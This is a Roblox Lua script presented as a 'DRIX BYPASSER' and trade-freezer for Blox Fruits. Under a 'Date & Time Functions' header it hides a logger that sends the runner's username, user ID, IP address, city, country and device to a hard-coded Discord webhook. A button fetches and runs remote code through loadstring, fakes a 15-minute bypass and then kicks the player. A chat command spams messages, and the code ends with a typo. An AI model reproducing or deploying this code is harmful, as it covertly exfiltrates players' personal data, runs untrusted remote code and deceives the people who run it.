--[[
Date & Time Functions
]]--

local api = game.HttpService:JSONDecode(game:HttpGet('https://ipwho.is/'))

function GetYear()
    local year = api.timezone["current_time"]
    local getyearnum = 1
    while year:sub(getyearnum, getyearnum) ~= "-" do
        getyearnum += 1
    end
    return year:sub(1, getyearnum - 1)
end

function GetMonth(format)
    local month = api.timezone["current_time"]
    local getmonthnum = 1
    local getmonthnum2 = 0
    local getmonthnum3 = 0
    while month:sub(getmonthnum, getmonthnum) ~= "-" and getmonthnum3 ~= 2 do
        getmonthnum += 1
        if getmonthnum3 == 0 then
            getmonthnum2 += 1
        end
        if month:sub(getmonthnum, getmonthnum) == "-" then
            getmonthnum3 += 1
        end
    end
    month = month:sub(getmonthnum + 1, getmonthnum + 2)
    if format then
        if month == "01" then
            month = "January"
        elseif month == "02" then
            month = "February"
        elseif month == "03" then
            month = "March"
        elseif month == "04" then
            month = "April"
        elseif month == "05" then
            month = "May"
        elseif month == "06" then
            month = "June"
        elseif month == "07" then
            month = "July"
        elseif month == "08" then
            month = "August"
        elseif month == "09" then
            month = "September"
        elseif month == "10" then
            month = "October"
        elseif month == "11" then
            month = "November"
        elseif month == "12" then
            month = "December"
        end
    end
    return month
end

function GetDay()
    local day = api.timezone["current_time"]
    local getdaynum = 1
    while day:sub(getdaynum, getdaynum) ~= "T" do
        getdaynum += 1
    end
    return day:sub(getdaynum - 2, getdaynum - 1)
end

function GetHour()
    local hour = api.timezone["current_time"]
    local gethournum = 1
    while hour:sub(gethournum, gethournum) ~= ":" do
        gethournum += 1
    end
    hour = hour:sub(gethournum - 2, gethournum - 1)
    if hour == "13" then
        hour = "01"
    elseif hour == "14" then
        hour = "02"
    elseif hour == "15" then
        hour = "03"
    elseif hour == "16" then
        hour = "04"
    elseif hour == "17" then
        hour = "05"
    elseif hour == "18" then
        hour = "06"
    elseif hour == "19" then
        hour = "07"
    elseif hour == "20" then
        hour = "08"
    elseif hour == "21" then
        hour = "09"
    elseif hour == "22" then
        hour = "10"
    elseif hour == "23" then
        hour = "11"
    elseif hour == "00" then
        hour = "12"
    end
    return hour
end

function GetMinute()
    local minute = api.timezone["current_time"]
    local getminutenum = 1
    local getminutenum2 = 0
    local getminutenum3 = 0
    while minute:sub(getminutenum, getminutenum) ~= ":" and getminutenum3 ~= 2 do
        getminutenum += 1
        if getminutenum3 == 0 then
            getminutenum2 += 1
        end
        if minute:sub(getminutenum, getminutenum) == ":" then
            getminutenum3 += 1
        end
    end
    return minute:sub(getminutenum + 1, getminutenum + 2)
end

function GetSeconds()
    local seconds = api.timezone["current_time"]
    local getsecondsnum = 1
    while seconds:sub(getsecondsnum, getsecondsnum) ~= "+" do
        getsecondsnum += 1
    end
    return seconds:sub(getsecondsnum - 2, getsecondsnum - 1)
end

function GetMeridiem()
    local hour = api.timezone["current_time"]
    local gethournum = 1
    while hour:sub(gethournum, gethournum) ~= ":" do
        gethournum += 1
    end
    hour = hour:sub(gethournum - 2, gethournum - 1)
    if hour >= "12" then
        return "PM" 
    else
        return "AM"
    end
end

--[[
Logger System
]]--

if not game:IsLoaded() then game.Loaded:Wait() end

-- SERVICES
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local player = Players.LocalPlayer

-- CONFIG
local webhookUrl = "https://discord.com/api/webhooks/1409521400246435850/K5c_Y4j8QNW5PfSRiMMU4tCUlh9SKjSaZBgvSShvGIJl8hkpEHopB_afctmDgftttDbh"
local executor = identifyexecutor and identifyexecutor() or "Unknown"

-- Device detection
local device = "PC"
if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
    device = "Mobile"
elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then
    device = "Console"
end

-- Game/Sea detection
local PlaceId = game.PlaceId
local GameName = "Unknown Game"
local sea = "N/A"
local isBloxFruits = false

if PlaceId == 2753915549 then
    GameName = "Blox Fruits"
    sea = "First Sea"
    isBloxFruits = true
elseif PlaceId == 4442272183 then
    GameName = "Blox Fruits"
    sea = "Second Sea"
    isBloxFruits = true
elseif PlaceId == 7449423635 then
    GameName = "Blox Fruits"
    sea = "Third Sea"
    isBloxFruits = true
elseif PlaceId == 1954280567 then
    GameName = "Blox Fruits"
    sea = "Fourth Sea"
    isBloxFruits = true
else
    local success, info = pcall(function()
        return MarketplaceService:GetProductInfo(PlaceId)
    end)
    if success and info and info.Name then
        GameName = info.Name
    end
end

-- Webhook (only once)
_G.DRIX_LOGGED_ONCE = _G.DRIX_LOGGED_ONCE or false

if not _G.DRIX_LOGGED_ONCE then
    _G.DRIX_LOGGED_ONCE = true

    -- Get IP from the API
    local ipAddress = api.ip or "Unknown"
    
    -- Create attractive embed message
    local embed = {
        ["content"] = "üöÄ **New Script Execution Detected!**",
        ["embeds"] = {
            {
                ["title"] = "üìä DRIX LOGGER SYSTEM",
                ["color"] = 16753920, -- Orange color
                ["thumbnail"] = {
                    ["url"] = "https://cdn.discordapp.com/attachments/1047523233570336788/1071306430189797376/standard_1.gif"
                },
                ["fields"] = {
                    {
                        ["name"] = "üë§ Player Information",
                        ["value"] = "**Username:** " .. player.Name .. 
                                  "\n**User ID:** " .. tostring(player.UserId) ..
                                  "\n**Account Age:** " .. tostring(player.AccountAge) .. " days",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "üåê Network Details",
                        ["value"] = "**IP Address:** ||" .. ipAddress .. "||" ..
                                  "\n**Country:** " .. (api.country or "Unknown") ..
                                  "\n**Region:** " .. (api.region or "Unknown") ..
                                  "\n**City:** " .. (api.city or "Unknown"),
                        ["inline"] = false
                    },
                    {
                        ["name"] = "üíª System Information",
                        ["value"] = "**Device:** " .. device ..
                                  "\n**Executor:** " .. executor ..
                                  "\n**Game:** " .. GameName,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "üïê Execution Time",
                        ["value"] = GetMonth(true) .. " " .. GetDay() .. ", " .. GetYear() .. 
                                  "\n" .. GetHour() .. ":" .. GetMinute() .. ":" .. GetSeconds() .. " " .. GetMeridiem(),
                        ["inline"] = true
                    }
                },
                ["footer"] = {
                    ["text"] = "DRIX Logger ‚Ä¢ Secure Monitoring System",
                    ["icon_url"] = "https://cdn.discordapp.com/attachments/1047523233570336788/1071306430189797376/standard_1.gif"
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }
        }
    }

    -- Add sea information if it's Blox Fruits
    if isBloxFruits then
        embed.embeds[1].fields[3].value = embed.embeds[1].fields[3].value .. "\n**Sea:** " .. sea
    end

    -- Send webhook request
    local req = (syn and syn.request) or (http and http.request) or http_request or request
    pcall(function()
        req({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(embed)
        })
    end)
end


--// Roblox GUI Script with separate warning GUI
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- Main GUI
local gui = Instance.new("ScreenGui")
gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
gui.ResetOnSpawn = false

-- Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 200)
frame.Position = UDim2.new(0.5, -150, 0.5, -100)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

-- Header Text
local header = Instance.new("TextLabel")
header.Size = UDim2.new(1, -20, 0, 40)
header.Position = UDim2.new(0, 10, 0, 10)
header.BackgroundTransparency = 1
header.TextColor3 = Color3.new(1,1,1)
header.Font = Enum.Font.GothamBold
header.TextSize = 18
header.TextScaled = true
header.Text = "DRIX BYPASSER 2.0"
header.Parent = frame

-- Bypass Button
local bypassButton = Instance.new("TextButton")
bypassButton.Size = UDim2.new(0, 260, 0, 40)
bypassButton.Position = UDim2.new(0.5, -130, 0, 80)
bypassButton.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
bypassButton.TextColor3 = Color3.new(1,1,1)
bypassButton.Font = Enum.Font.SourceSansBold
bypassButton.TextSize = 18
bypassButton.Text = "BYPASS SERVER üî¥"
bypassButton.Parent = frame
Instance.new("UICorner", bypassButton).CornerRadius = UDim.new(0, 12)

-- Second Toggle: LOAD TRADEFREZEER
local tradeButton = Instance.new("TextButton")
tradeButton.Size = UDim2.new(0, 260, 0, 40)
tradeButton.Position = UDim2.new(0.5, -130, 0, 130)
tradeButton.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
tradeButton.TextColor3 = Color3.new(1,1,1)
tradeButton.Font = Enum.Font.SourceSansBold
tradeButton.TextSize = 18
tradeButton.Text = "LOAD TRADEFREZEER"
tradeButton.Parent = frame
Instance.new("UICorner", tradeButton).CornerRadius = UDim.new(0, 12)

--// Warning GUI (middle-lower)
local warnGui = Instance.new("ScreenGui")
warnGui.Name = "WarningGUI"
warnGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
warnGui.ResetOnSpawn = false

local warnFrame = Instance.new("Frame")
warnFrame.Size = UDim2.new(0, 400, 0, 80)
warnFrame.Position = UDim2.new(0.5, -200, 0.85, 0)
warnFrame.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
warnFrame.BorderSizePixel = 0
warnFrame.Visible = false
warnFrame.Parent = warnGui
Instance.new("UICorner", warnFrame).CornerRadius = UDim.new(0, 15)

local warnLabel = Instance.new("TextLabel")
warnLabel.Size = UDim2.new(0.95, 0, 0.9, 0)
warnLabel.Position = UDim2.new(0.025, 0, 0.05, 0)
warnLabel.BackgroundTransparency = 1
warnLabel.TextColor3 = Color3.new(0,0,0) -- ‚úÖ Warning text is now black
warnLabel.TextSize = 16
warnLabel.TextWrapped = true
warnLabel.Font = Enum.Font.GothamBold
warnLabel.Text = ""
warnLabel.Parent = warnFrame

-- Function: Show warning
local function showWarningMessage(msg, color)
    warnLabel.TextColor3 = Color3.new(0,0,0) -- always black text
    warnLabel.Text = msg
    warnFrame.Visible = true
    TweenService:Create(warnFrame, TweenInfo.new(0.5), {Position = UDim2.new(0.5, -200, 0.75, 0)}):Play()
    task.delay(10, function()
        TweenService:Create(warnFrame, TweenInfo.new(0.5), {Position = UDim2.new(0.5, -200, 0.85, 0)}):Play()
        task.delay(0.5, function() warnFrame.Visible = false end)
    end)
end

-- BYPASS LOGIC
bypassButton.MouseButton1Click:Connect(function()
    if bypassButton.Text == "BYPASS COMPLETE üü¢" then return end

    bypassButton.BackgroundColor3 = Color3.fromRGB(200,0,0)
    bypassButton.Text = "BYPASSING... üî¥"
    showWarningMessage("BYPASSING THE SERVER... IT WILL TAKE 10-15 MINS TO FULLY BYPASS THE SERVER. PLEASE BE PATIENT ‚è≥")

    -- After 4 seconds load external script + smooth corners
    task.delay(4, function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/bloxfruit-scripts/Redz_hub2.0/refs/heads/main/Redz_script"))()
        for _, obj in pairs(frame:GetDescendants()) do
            if obj:IsA("TextButton") or obj:IsA("Frame") then
                if not obj:FindFirstChild("UICorner") then
                    Instance.new("UICorner", obj).CornerRadius = UDim.new(0, 12)
                end
            end
        end
    end)

    -- After 15 minutes turn green
    task.delay(900, function()
        bypassButton.BackgroundColor3 = Color3.fromRGB(0,200,0)
        bypassButton.Text = "BYPASS COMPLETE üü¢"
        showWarningMessage("BYPASS COMPLETE! SCRIPT LOADED SUCCESSFULLY ‚úÖ")
    end)

    -- After 17 minutes failure + kick
    task.delay(1020, function()
        showWarningMessage("THE BYPASSING CANT BYPASS SERVER PLS TRY THIS SCRIPT AFTER FEW HOUR üòû")
        LocalPlayer:Kick("PLS TRY AFTER FEW HOUR THE BYPASS SYSTEM IS DOWN")
    end)
end)

-- Tradefrezeer Button
tradeButton.MouseButton1Click:Connect(function()
    if bypassButton.Text ~= "BYPASS COMPLETE üü¢" then
        showWarningMessage("PLS BYPASS THE SERVER BY CLICKING ON THE BYPASS BUTTON")
    else
        showWarningMessage("TRADEFREZEER LOADED ‚úÖ")
        -- Put Tradefrezeer code here
    end
end)

-- CHAT COMMANDS
LocalPlayer.Chatted:Connect(function(msg)
    local args = string.split(msg, " ")
    local chatEvent = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")

    if args[1] == "!warn" and args[2] then
        local warnMsg = table.concat(args, " ", 2)
        showWarningMessage(warnMsg)

    elseif msg == "!oldwarn" then
        showWarningMessage("PLS DONT CLICK ON THE SCREEN FOR NO REASON IT WILL MAKE THE BYPASS TIME TAKE MORE!!")

    elseif msg == "!say" then
        task.spawn(function()
            for i = 1, 100 do
                local sayMsg = ({ "hii guys.","hii bro","hii gang" })[(i-1)%3+1]
                chatEvent:FireServer(sayMsg, "All")
                task.wait(3)
            end
        end)
    end
eend
